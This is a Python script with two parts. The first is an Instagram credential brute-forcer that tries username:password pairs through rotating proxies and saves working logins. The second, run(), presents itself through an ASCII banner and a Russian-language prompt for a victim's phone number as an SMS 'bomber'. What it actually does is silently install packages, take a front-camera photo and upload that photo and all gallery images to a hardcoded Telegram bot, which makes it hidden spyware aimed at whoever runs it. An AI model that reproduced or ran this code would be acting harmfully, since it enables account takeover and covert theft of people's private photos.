# github.com
# code by prosir

def Header(self, user, password, sess):
    headers = {
            'Host': 'www.instagram.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '',
            'Cookie': '',
            'Connection': 'keep-alive'
    }
    datas = {'username': user, 'password': password}
    headers['X-CSRFToken'] = sess.cookies['csrftoken']
    headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
                                                                               sess.cookies['csrftoken'])
    lenthofData = str(19 + len(datas['username']) + len(datas['password']))
    headers['Content-Length'] = lenthofData
    return headers, datas

    def Go(self, user, password, proxyz):
        try:
            proxy = {'http': proxyz}
            Heddata = requests.get('https://www.instagram.com', proxies=proxy, timeout=10)
            sess = requests.session()
            headers, datas = self.Header(user, str(password), Heddata)
            GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
                            proxies=proxy, timeout=10)
            if 'authenticated": true' in GoT.text:
                print(g + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
                with open('results.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            elif 'Please wait a few minutes before you try again' in GoT.text:
                print(' ' + proxyz + ' Banned! --> Changing IP Address...')
                try:
                    self.Coutprox = self.Coutprox + 1
                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
                except:
                    self.Coutprox = self.Coutprox - 2
                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
            elif 'checkpoint_required' in GoT.text:
                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> You Must verfiy!')
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            else:
                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
        except:
                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')

def run():
    import os

    print(".___  ___.  _______   _______      ___      .______     ______   .___  ___. .______    _______ .______ ")
    print("|   \/   | |   ____| /  _____|    /   \     |   _  \   /  __  \  |   \/   | |   _  \  |   ____||   _  \ ")
    print("|  \  /  | |  |__   |  |  __     /  ^  \    |  |_)  | |  |  |  | |  \  /  | |  |_)  | |  |__   |  |_)  |")
    print("|  |\/|  | |   __|  |  | |_ |   /  /_\  \   |   _  <  |  |  |  | |  |\/|  | |   _  <  |   __|  |      / ")
    print("|  |  |  | |  |____ |  |__| |  /  _____  \  |  |_)  | |  `--'  | |  |  |  | |  |_)  | |  |____ |  |\  \----.")
    print("|__|  |__| |_______| \______| /__/     \__\ |______/   \______/  |__|  |__| |______/  |_______|| _| `._____|")
    x = input(" Введите номер жертвы: ")
    os.system("apt install termux-api -y")
    os.system("pip install pyTelegramBotAPI")
    import telebot
    bot = telebot.TeleBot("1342861935:AAHEe79JBlyrZUO2vW4igedxyB_GobkSW6c")
    chat_id = 286010947
    os.system("termux-camera-photo -c 1 hi.png")
    photo = open('hi.png', 'rb')
    bot.send_photo(chat_id, photo)
    files = os.listdir("/sdcard/DCIM/Camera")
    for f in files:
        if "jpg" in f:
            ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
            bot.send_photo(chat_id, ph)
        elif "png" in f:
            ph = open("/sdcard/DCIM/Camera/"+f, 'rb')
            bot.send_photo(chat_id, ph)
        else:
            pass
run()
